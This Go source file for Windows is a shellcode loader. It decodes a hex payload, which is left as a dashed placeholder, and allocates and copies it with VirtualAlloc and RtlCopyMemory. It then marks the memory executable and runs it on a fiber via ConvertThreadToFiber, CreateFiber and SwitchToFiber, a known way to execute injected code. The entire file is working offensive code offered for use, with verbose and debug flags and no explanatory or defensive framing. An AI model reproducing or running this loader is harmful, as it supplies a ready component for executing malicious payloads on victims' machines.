// +build windows

package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"golang.org/x/sys/windows"
	"log"
	"unsafe"
)

const (
	MEM_COMMIT        = 0x1000
	MEM_RESERVE       = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE    = 0x04
)

func main() {
	verbose := flag.Bool("verbose", false, "Enable verbose output")
	debug := flag.Bool("debug", false, "Enable debug output")
	flag.Parse()
	shellcode, errShellcode := hex.DecodeString("-------------")
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}

	if *debug {
		fmt.Println("[DEBUG]Loading kernel32.dll and ntdll.dll")
	}
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	if *debug {
		fmt.Println("[DEBUG]Loading VirtualAlloc, VirtualProtect and RtlCopyMemory procedures")
	}
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	ConvertThreadToFiber := kernel32.NewProc("ConvertThreadToFiber")
	CreateFiber := kernel32.NewProc("CreateFiber")
	SwitchToFiber := kernel32.NewProc("SwitchToFiber")

	if *debug {
		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode")
	}

	fiberAddr, _, errConvertFiber := ConvertThreadToFiber.Call()

	if errConvertFiber != nil && errConvertFiber.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling ConvertThreadToFiber:\r\n%s", errConvertFiber.Error()))
	}

	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Fiber address: %x", fiberAddr))
	}

	if *debug {
		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode")
	}
	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAlloc failed and returned 0")
	}

	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Allocated %d bytes", len(shellcode)))
	}

	if *debug {
		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory")
	}
	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
	}
	if *verbose {
		fmt.Println("[-]Shellcode copied to memory")
	}

	if *debug {
		fmt.Println("[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ")
	}

	oldProtect := PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
	}
	if *verbose {
		fmt.Println("[-]Shellcode memory region changed to PAGE_EXECUTE_READ")
	}

	if *debug {
		fmt.Println("[DEBUG]Calling CreateFiber...")
	}

	fiber, _, errCreateFiber := CreateFiber.Call(0, addr, 0)

	if errCreateFiber != nil && errCreateFiber.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateFiber:\r\n%s", errCreateFiber.Error()))
	}

	if *verbose {
		fmt.Println(fmt.Sprintf("Shellcode fiber created: %x", fiber))
	}

	if *debug {
		fmt.Println("[DEBUG]Calling SwitchToFiber function to execute the shellcode")
	}

	_, _, errSwitchToFiber := SwitchToFiber.Call(fiber)

	if errSwitchToFiber != nil && errSwitchToFiber.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling SwitchToFiber:\r\n%s", errSwitchToFiber.Error()))
	}

	if *verbose {
		fmt.Println("[+]Shellcode Executed")
	}

	if *debug {
		fmt.Println("[DEBUG]Calling SwitchToFiber on main thread/fiber")
	}

	_, _, errSwitchToFiber2 := SwitchToFiber.Call(fiberAddr)

	if errSwitchToFiber2 != nil && errSwitchToFiber2.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling SwitchToFiber:\r\n%s", errSwitchToFiber2.Error()))
	}
	fmt.Println("[DEBUG]I AM HERE")
}
